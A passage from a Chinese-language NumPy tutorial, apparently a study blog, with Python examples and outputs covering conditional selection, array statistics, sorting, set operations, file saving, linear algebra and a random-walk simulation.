<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">result = np.where(cond1 &amp;cond2, <span class="number">0</span>,</span><br><span class="line">                  np.where(cond1, <span class="number">1</span>,</span><br><span class="line">                           np.where(cond2, <span class="number">2</span>, <span class="number">3</span>)))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0 3 1 0 2]</span><br></pre></td></tr></table></figure>
</li>
<li><p>用“布尔值在计算过程中可以被当做0或1处理”，用算术运算（感觉像黑魔法）<br>:有问题？:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="number">1</span>* (cond1 - cond2) + <span class="number">2</span>* (cond2 &amp; - cond1) +<span class="number">3</span> * - (cond1 | cond2)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0 3 1 0 3]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="数学和统计方法"><a href="#数学和统计方法" class="headerlink" title="数学和统计方法"></a>数学和统计方法</h2><h3 id="sum-mean-std既可以当做实例方法，也可以当做顶级numpy函数使用"><a href="#sum-mean-std既可以当做实例方法，也可以当做顶级numpy函数使用" class="headerlink" title="sum, mean, std既可以当做实例方法，也可以当做顶级numpy函数使用"></a>sum, mean, std既可以当做实例方法，也可以当做顶级numpy函数使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr = np.random.randn(<span class="number">5</span>,<span class="number">4</span>) <span class="comment">#正态分布的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> arr.mean()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------"</span></span><br><span class="line"><span class="keyword">print</span> np.mean(arr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------"</span></span><br><span class="line"><span class="keyword">print</span> arr.sum()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0.0748211510483</span><br><span class="line">-----------------------</span><br><span class="line">0.0748211510483</span><br><span class="line">-----------------------</span><br><span class="line">1.49642302097</span><br></pre></td></tr></table></figure>
<h3 id="mean-与-sum这类函数可以接受一个axis参数（用于计算该轴上的统计值），最终结构是少一维度的数组-axis和想象中相反-lt-span-gt-mean-与-sum这类函数可以接受一个axis参数用于计算该轴上的统计值最终结构是少一维度的数组"><a href="#mean-与-sum这类函数可以接受一个axis参数（用于计算该轴上的统计值），最终结构是少一维度的数组-axis和想象中相反-lt-span-gt-mean-与-sum这类函数可以接受一个axis参数用于计算该轴上的统计值最终结构是少一维度的数组" class="headerlink" title="mean 与 sum这类函数可以接受一个axis参数（用于计算该轴上的统计值），最终结构是少一维度的数组 axis和想象中相反&lt;/span&gt; [mean-与-sum这类函数可以接受一个axis参数用于计算该轴上的统计值最终结构是少一维度的数组]"></a>mean 与 sum这类函数可以接受一个axis参数（用于计算该轴上的统计值），最终结构是少一维度的数组 <span class="tag" tag-name="axis和想象中相反"><span class="smallcaps">axis和想象中相反</span>&lt;/span&gt; [mean-与-sum这类函数可以接受一个axis参数用于计算该轴上的统计值最终结构是少一维度的数组]</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"---------------------"</span></span><br><span class="line"><span class="keyword">print</span> arr.mean(axis = <span class="number">1</span>) <span class="comment">#在轴1中传播,即在列中进行计算</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"---------------------"</span></span><br><span class="line"><span class="keyword">print</span> arr.sum(<span class="number">0</span>) <span class="comment">#轴0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"---------------------"</span></span><br><span class="line"><span class="keyword">print</span> arr.sum(<span class="number">1</span>) <span class="comment">#轴1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[[ 0.79860446 -0.67843272  2.58233563  0.33419308]</span><br><span class="line"> [ 0.22848276 -1.42518949 -1.04403965 -0.3835565 ]</span><br><span class="line"> [-0.34612276  1.39126673  0.29382674  0.53407341]</span><br><span class="line"> [ 1.21116404 -1.05950897  0.18198447 -0.99575602]</span><br><span class="line"> [ 0.81490393 -2.09189052  0.27434089  0.87574352]]</span><br><span class="line">---------------------</span><br><span class="line">[ 0.75917511 -0.65607572  0.46826103 -0.16552912 -0.03172555]</span><br><span class="line">---------------------</span><br><span class="line">[ 2.70703243 -3.86375497  2.28844807  0.36469749]</span><br><span class="line">---------------------</span><br><span class="line">[ 3.03670044 -2.62430288  1.87304412 -0.66211648 -0.12690218]</span><br></pre></td></tr></table></figure>
<h3 id="cumsum-和-cumprod之类不聚合，产生一个由中间结果组成的数组"><a href="#cumsum-和-cumprod之类不聚合，产生一个由中间结果组成的数组" class="headerlink" title="cumsum 和 cumprod之类不聚合，产生一个由中间结果组成的数组"></a>cumsum 和 cumprod之类不聚合，产生一个由中间结果组成的数组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">arr = np.array([[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]])</span><br><span class="line">print(arr.cumsum(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-------------------"</span></span><br><span class="line">print(arr.cumsum(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-------------------"</span></span><br><span class="line">print(arr.cumprod(<span class="number">1</span>))  <span class="comment">#积累相乘</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[[ 0  1  2]</span><br><span class="line"> [ 3  5  7]</span><br><span class="line"> [ 9 12 15]]</span><br><span class="line">-------------------</span><br><span class="line">[[ 0  1  3]</span><br><span class="line"> [ 3  7 12]</span><br><span class="line"> [ 6 13 21]]</span><br><span class="line">-------------------</span><br><span class="line">[[  0   0   0]</span><br><span class="line"> [  3  12  60]</span><br><span class="line"> [  6  42 336]]</span><br></pre></td></tr></table></figure>
<h3 id="基本数组统计方法"><a href="#基本数组统计方法" class="headerlink" title="基本数组统计方法"></a>基本数组统计方法</h3><div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>sum</td>
<td>全部，或者某轴向的元素求和</td>
</tr>
<tr>
<td>mean</td>
<td>算术平均数，零长度的数组的mean为NaN</td>
</tr>
<tr>
<td>std</td>
<td>标准差，自由度可调（默认为n）</td>
</tr>
<tr>
<td>var</td>
<td>方差，自由度可调（默认为n)</td>
</tr>
<tr>
<td>min</td>
<td>最小值</td>
</tr>
<tr>
<td>max</td>
<td>最大值</td>
</tr>
<tr>
<td>argmin</td>
<td>最小值索引</td>
</tr>
<tr>
<td>argmax</td>
<td>最大值索引</td>
</tr>
<tr>
<td>cumsum</td>
<td>元素的累计和</td>
</tr>
<tr>
<td>cumprod</td>
<td>元素的累计乘积</td>
</tr>
</tbody>
</table>
</div>
<h3 id="用于布尔型数组的方法"><a href="#用于布尔型数组的方法" class="headerlink" title="用于布尔型数组的方法"></a>用于布尔型数组的方法</h3><ol>
<li><p>可以用sum来求True的计数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr = np.random.randn(<span class="number">100</span>)</span><br><span class="line">print((arr&gt; <span class="number">0</span>).sum())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52</span><br></pre></td></tr></table></figure>
</li>
<li><p>any all 来测试数组是否存在一个及以上的True,是否所有值为True</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bools = np.array([<span class="literal">False</span>,<span class="literal">False</span>,<span class="literal">True</span>,<span class="literal">False</span>])</span><br><span class="line">print(bools.any())</span><br><span class="line">print(bools.all())</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><ol>
<li><p>numpy数组自带sort方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr = np.random.randn(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> (arr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"---------------------------------------------------"</span></span><br><span class="line">arr.sort()</span><br><span class="line"><span class="keyword">print</span> (arr)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ 1.8328002   0.41074931 -0.60400869  1.53465964 -0.60704556 -0.16515945</span><br><span class="line"> -1.02657211 -0.91581907]</span><br><span class="line">---------------------------------------------------</span><br><span class="line">[-1.02657211 -0.91581907 -0.60704556 -0.60400869 -0.16515945  0.41074931</span><br><span class="line">  1.53465964  1.8328002 ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>多维数组中任意轴上进行排序，只需参数线路轴编号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr = np.random.randn(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------------"</span></span><br><span class="line">arr.sort(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[[-0.51009631 -1.66867772 -0.22805943]</span><br><span class="line"> [-0.66434219  0.38498122 -1.23044479]</span><br><span class="line"> [-0.39114451  0.01949044 -1.25717288]</span><br><span class="line"> [-0.00524041  0.42130187 -2.21689239]</span><br><span class="line"> [ 0.95358967 -0.94485412 -0.84467746]]</span><br><span class="line">-----------------------------</span><br><span class="line">[[-1.66867772 -0.51009631 -0.22805943]</span><br><span class="line"> [-1.23044479 -0.66434219  0.38498122]</span><br><span class="line"> [-1.25717288 -0.39114451  0.01949044]</span><br><span class="line"> [-2.21689239 -0.00524041  0.42130187]</span><br><span class="line"> [-0.94485412 -0.84467746  0.95358967]]</span><br></pre></td></tr></table></figure>
</li>
<li><p>顶级方法np.sort不会改变原数组，返回已经排序的副本</p>
</li>
</ol>
<h3 id="唯一化以及其他的集合逻辑"><a href="#唯一化以及其他的集合逻辑" class="headerlink" title="唯一化以及其他的集合逻辑"></a>唯一化以及其他的集合逻辑</h3><ol>
<li><p>np.unique 返回数组已排序的唯一值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">names = np.array([<span class="string">"Bob"</span>, <span class="string">'Joe'</span>,<span class="string">'Will'</span>,<span class="string">'Bob'</span>,<span class="string">'Will'</span>,<span class="string">'Joe'</span>,<span class="string">'Joe'</span>])</span><br><span class="line"><span class="keyword">print</span> np.unique(names)</span><br><span class="line">ints = np.array([<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> np.unique(ints)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-------------"</span></span><br><span class="line"><span class="keyword">print</span> sorted(set(names)) <span class="comment">#纯python代码，与之等价</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&apos;Bob&apos; &apos;Joe&apos; &apos;Will&apos;]</span><br><span class="line">[1 2 3 4]</span><br><span class="line">-------------</span><br><span class="line">[&apos;Bob&apos;, &apos;Joe&apos;, &apos;Will&apos;]</span><br></pre></td></tr></table></figure>
</li>
<li><p>np.in1d 返回一个数组的值是否在另一个数组中，返回一个布尔型数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">values = np.array([<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">a = np.in1d(values, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>])</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"><span class="keyword">print</span> values[a]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ True False False  True  True False  True]</span><br><span class="line">[6 3 2 6]</span><br></pre></td></tr></table></figure>
</li>
<li><p>数组集合运算</p>
<p>|    函数             |             描述                                                 |<br>|—————————|———————————————————————————————|<br>| unique(x)        | 计算x中的唯一元素，并返回有序的结果                          |<br>| intersect1d(x,y) | 计算x和y的公共元素，并返回有序结果                           |<br>| union1d(x,y)     | 计算x和y的并集，并返回结果                                   |<br>| in1d(x,y)        | 得到一个“x的元素是否包含于y”的布尔型数组                     |<br>| setdiff1d(x,y)   | 集合的差，机元素在x中且不在y中                               |<br>| setxor1d(x,y)    | 集合的对称差，即存在于一个数组中但不同是存在两个数组中的元素 |<br>|                  |                                                              |</p>
</li>
</ol>
<h3 id="用于数组的文件输入输出"><a href="#用于数组的文件输入输出" class="headerlink" title="用于数组的文件输入输出"></a>用于数组的文件输入输出</h3><ol>
<li><p>以数组为二进制格式保存到磁盘</p>
<ol>
<li><p>np.save, np.load</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">10</span>)</span><br><span class="line">np.save(<span class="string">'some_array'</span>,arr) <span class="comment">#不加后缀名，自动添加.npy</span></span><br><span class="line"><span class="keyword">print</span> np.load(<span class="string">"some_array.npy"</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0 1 2 3 4 5 6 7 8 9]</span><br></pre></td></tr></table></figure>
</li>
<li><p>np.savez<br>可以将doge数组保存到一个压缩文件中，将数组以关键字参数的形式传入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr1 = np.arange(<span class="number">10</span>)</span><br><span class="line">arr2 = np.arange(<span class="number">1</span>,<span class="number">20</span>,<span class="number">2</span>)</span><br><span class="line">np.savez(<span class="string">"array_archive.npz"</span>,a = arr1, b = arr2)</span><br><span class="line">arch = np.load(<span class="string">"array_archive.npz"</span>)</span><br><span class="line"><span class="keyword">print</span> arch[<span class="string">"b"</span>]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>存取文本文件</p>
<ol>
<li><p>np.loadtxt(“xx”, deliniter = “,”) #第二个参数为分隔符</p>
</li>
<li><p>np.genfromtxt() 面向的是结构化数组和缺失数据处理</p>
</li>
</ol>
</li>
</ol>
<h3 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h3><ol>
<li><p>dot 方法</p>
</li>
<li><p>linalg</p>
<ol>
<li><p>有一组标准的矩阵分解运算以及求逆和行列式 之类的东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> inv, qr</span><br><span class="line"><span class="keyword">from</span> numpy.random <span class="keyword">import</span> randn</span><br><span class="line">x = randn(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">mat = x.T.dot(x)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"inv(mat)----------------"</span></span><br><span class="line"><span class="keyword">print</span> inv(mat)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"mat.dot(inv(mat))---------------------------"</span></span><br><span class="line"><span class="keyword">print</span> mat.dot(inv(mat))</span><br><span class="line">q, r = qr(mat)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"q---------------------------"</span></span><br><span class="line"><span class="keyword">print</span> q</span><br><span class="line"><span class="keyword">print</span> <span class="string">"r---------------------------"</span></span><br><span class="line"><span class="keyword">print</span> r</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">inv(mat)----------------</span><br><span class="line">[[   5.24583468   14.98884503    9.71335736   -7.77651755  -22.8396013 ]</span><br><span class="line"> [  14.98884503   46.52511417   28.81764808  -22.01122276  -69.70405132]</span><br><span class="line"> [   9.71335736   28.81764808   18.67257302  -14.00870932  -44.03024424]</span><br><span class="line"> [  -7.77651755  -22.01122276  -14.00870932   12.70341866   32.9416411 ]</span><br><span class="line"> [ -22.8396013   -69.70405132  -44.03024424   32.9416411   106.1381638 ]]</span><br><span class="line">mat.dot(inv(mat))---------------------------</span><br><span class="line">[[  1.00000000e+00  -1.27763158e-14  -3.16524540e-15   5.52810747e-15</span><br><span class="line">   -1.55455587e-14]</span><br><span class="line"> [ -8.09523246e-15   1.00000000e+00  -5.76325857e-15  -1.66274227e-15</span><br><span class="line">    2.52694539e-14]</span><br><span class="line"> [  1.00097108e-15   2.71639602e-16   1.00000000e+00  -9.81680658e-15</span><br><span class="line">    3.54119545e-15]</span><br><span class="line"> [ -6.64139148e-16   1.57971687e-14   3.29027055e-15   1.00000000e+00</span><br><span class="line">   -2.99822967e-14]</span><br><span class="line"> [ -3.04200410e-15  -8.84058697e-15   1.92099465e-15  -8.57631485e-15</span><br><span class="line">    1.00000000e+00]]</span><br><span class="line">q---------------------------</span><br><span class="line">[[-0.91326408  0.01491589 -0.30364189  0.21681123 -0.16285184]</span><br><span class="line"> [-0.08041303 -0.74311076  0.43827531 -0.04710955 -0.49700662]</span><br><span class="line"> [ 0.33046062 -0.31708316 -0.83157252  0.01337763 -0.31394621]</span><br><span class="line"> [-0.21986762 -0.15288857 -0.13263187 -0.92494467  0.23488181]</span><br><span class="line"> [-0.04400528 -0.56890005 -0.08131595  0.30833745  0.75679059]]</span><br><span class="line">r---------------------------</span><br><span class="line">[[ -1.40092662e+01  -1.26845899e+00   5.84338504e+00  -3.35403461e+00</span><br><span class="line">   -3.83026371e-01]</span><br><span class="line"> [  0.00000000e+00  -2.13935952e+00  -2.42468320e+00  -6.51800989e-01</span><br><span class="line">   -2.21389665e+00]</span><br><span class="line"> [  0.00000000e+00   0.00000000e+00  -2.44765043e+00  -3.82142992e-01</span><br><span class="line">   -8.97542800e-01]</span><br><span class="line"> [  0.00000000e+00   0.00000000e+00   0.00000000e+00  -4.11638083e-01</span><br><span class="line">    1.30663382e-01]</span><br><span class="line"> [  0.00000000e+00   0.00000000e+00   0.00000000e+00   0.00000000e+00</span><br><span class="line">    7.13024012e-03]]</span><br></pre></td></tr></table></figure>
</li>
<li><p>linalg的一些常用函数</p>
<p>|     函数  |              描述                                                                                   |<br>|———-|————————————————————————————————————————————————-|<br>| diag  | 以一维数组的形式返回方阵的对角线（或非对角线）元素，或将一维数组转换成为方阵（非对角线元素为0） |<br>| dot   | 矩阵乘法                                                                                        |<br>| trace | 计算对角线元素的和                                                                              |<br>| det   | 计算矩阵行列式                                                                                  |<br>| eig   | 计算方阵的本征值和本征向量                                                                      |<br>| inv   | 计算方阵的逆                                                                                    |<br>| pinv  | 计算矩阵的Moore-Penrose违逆                                                                     |<br>| qr    | 计算QR分解                                                                                      |<br>| svd   | 计算奇异值分解（SVD)                                                                            |<br>| solve | 解线性方程Ax= b,其中A为一个方阵                                                                 |<br>| lstsq | 计算Ax = b的最小二乘解                                                                          |</p>
</li>
</ol>
</li>
</ol>
<h3 id="随机数生成"><a href="#随机数生成" class="headerlink" title="随机数生成"></a>随机数生成</h3><ol>
<li><p>numpy.random模块对内置random进行了补充</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">samples = np.random.normal(size = (<span class="number">4</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> samples</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[[-0.2577954  -1.84871926 -1.73680389  0.75279352]</span><br><span class="line"> [-0.39841909 -1.57836749  0.58627939 -0.02390301]</span><br><span class="line"> [ 0.26546489  1.05297095  0.19336693  0.90791299]</span><br><span class="line"> [-0.74260739 -1.06363081  0.27326372 -0.00851723]]</span><br></pre></td></tr></table></figure>
</li>
<li><p>部分numpy.random函数</p>
<p>|      函数       |     描述                                                           |<br>|——————-|————————————————————————————————|<br>| seed        | 确定随机数生成器的种子                                         |<br>| permutation | 返回一个序列的随机排列或返回一个随机排列的范围                 |<br>| shuffle     | 对一个序列就地随机排列                                         |<br>| rand        | 产生均匀分布的样本值                                           |<br>| randint     | 从给定的上下限范围内随机选取整数,size参数（int)                |<br>| randn       | 产生正态分布（平均值为0，标准差为1）的样本值，类似于MATLAB接口 |<br>| binomial    | 产生二项分布的样本值                                           |<br>| normal      | 产生正态（高斯）分布的样本值                                   |<br>| beta        | 产生Beta分布的样本值                                           |<br>| chisquare   | 产生卡方分布的样本值                                           |<br>| gamma       | 产生Gamma分布的样本值                                          |<br>| uniform     | 产生在[0,1)中均匀分布的样本值                                 |<br>|             |                                                                |</p>
</li>
<li><p>范例：随机漫步</p>
<ol>
<li><p>单个随机漫步</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment">#传统python代码</span></span><br><span class="line">position = <span class="number">0</span></span><br><span class="line">walk = [position]</span><br><span class="line">steps = <span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(steps):</span><br><span class="line">    step = <span class="number">1</span> <span class="keyword">if</span> random.randint(<span class="number">0</span>,<span class="number">1</span>) <span class="keyword">else</span> <span class="number">-1</span> <span class="comment">#新的写法</span></span><br><span class="line">    position += step</span><br><span class="line">    walk.append(position)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#numpy.random方法</span></span><br><span class="line">nsteps = <span class="number">1000</span></span><br><span class="line">draws = np.random.randint(<span class="number">0</span>,<span class="number">2</span>,size = nsteps)</span><br><span class="line">steps = np.where(draws &gt;<span class="number">0</span>, <span class="number">1</span>,<span class="number">-1</span>)</span><br><span class="line">walk = steps.cumsum()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"walk.min()----------"</span></span><br><span class="line"><span class="keyword">print</span> walk.min()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"walk.max()------------"</span></span><br><span class="line"><span class="keyword">print</span> walk.max()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">walk.min()----------</span><br><span class="line">-14</span><br><span class="line">walk.max()------------</span><br><span class="line">26</span><br></pre></td></tr></table></figure>
</li>
<li><p>一次性模拟多个随机漫步</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nwalks = <span class="number">5000</span></span><br><span class="line">nsteps = <span class="number">1000</span></span><br><span class="line">draws = np.random.randint(<span class="number">0</span>,<span class="number">2</span>, size = (nwalks, nsteps))</span><br><span class="line">steps = np.where(draws &gt;<span class="number">0</span>, <span class="number">1</span>, <span class="number">-1</span>)</span><br><span class="line">walks = steps.cumsum(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"walks.max()----------"</span></span><br><span class="line"><span class="keyword">print</span> walks.max()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"walks.min()----------"</span></span><br><span class="line"><span class="keyword">print</span> walks.min()</span><br><span class="line"><span class="comment">#选出超过30或-30的walk</span></span><br><span class="line">hits30 = (np.abs(walks) &gt;= <span class="number">30</span>).any(<span class="number">1</span>) <span class="comment">#any是在轴1上广播，即计算各个行中有没有绝对值30以上的</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"到达30或-30的数量"</span></span><br><span class="line"><span class="keyword">print</span> hits30.sum() <span class="comment">#到达30或-30的数量</span></span><br><span class="line"><span class="comment">#利用这个数据来选出那些行，并调用argmax在轴1上获取穿越时间</span></span><br><span class="line">crossing_times = (np.abs(walks[hits30]) &gt;= <span class="number">30</span>).argmax(<span 